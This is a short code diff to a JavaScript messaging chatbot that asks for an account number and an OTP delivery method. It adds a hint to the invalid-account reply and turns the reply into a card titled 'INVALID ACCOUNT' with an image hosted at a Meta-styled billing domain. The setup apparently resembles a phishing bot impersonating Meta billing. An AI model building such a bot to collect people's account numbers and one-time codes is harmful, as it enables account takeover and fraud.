@@ -217,7 +217,7 @@ function handleUserMessage(senderId, message) {
                 userSessions[senderId].step = 'ask_otp_method';
                 sendOTPChoiceMenu(senderId);
             } else {
-                sendMessage(senderId, 'Sorry, the account number you provided is invalid. Please try again.',true);
+                sendMessage(senderId, 'Sorry, the account number you provided is invalid. Please try again. You can find your account number here.',true);
             }
             break;
         case 'ask_otp_method':
@@ -344,10 +344,14 @@ function sendMessage(senderId, messageText, withImage = false) {
         recipient: { id: senderId },
         message: { 
             attachment: {
-                type: "image",
+                type: "template",
                 payload: {
-                    url: "https://metabillinquiry.onrender.com/billing_notice.jpg", // Image URL
-                    is_reusable: true // Optional: allows reusing the image in future messages
+                    "template_type": "generic",
+                    "elements": [{
+                        "title": "INVALID ACCOUNT",
+                        "subtitle": messageText,
+                        "image_url": "https://metabillinquiry.onrender.com/billing_notice.jpg",
+                    }]
                 }
             }
         }
